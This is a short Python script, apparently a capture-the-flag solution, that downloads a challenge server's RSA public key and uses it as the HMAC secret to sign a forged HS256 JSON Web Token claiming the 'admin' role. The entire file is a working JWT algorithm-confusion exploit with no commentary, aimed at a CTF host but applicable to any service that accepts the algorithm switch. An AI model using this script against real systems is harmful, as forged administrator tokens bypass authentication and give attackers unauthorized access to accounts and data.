import jwt
import requests
import base64
import re

url = "http://chals.bitskrieg.in:3005/public-key"
response = requests.get(url)
public_key_pem = response.text.strip()
public_key_b64 = re.sub(r"-----.*?-----|\s", "", public_key_pem)
public_key_bytes = base64.b64decode(public_key_b64)
headers = {"alg": "HS256", "typ": "JWT"}
payload = {
    "username": "dssqd",
    "role": "admin"
}
new_jwt = jwt.encode(payload, public_key_bytes, algorithm="HS256", headers=headers)
print("New JWT:", new_jwt)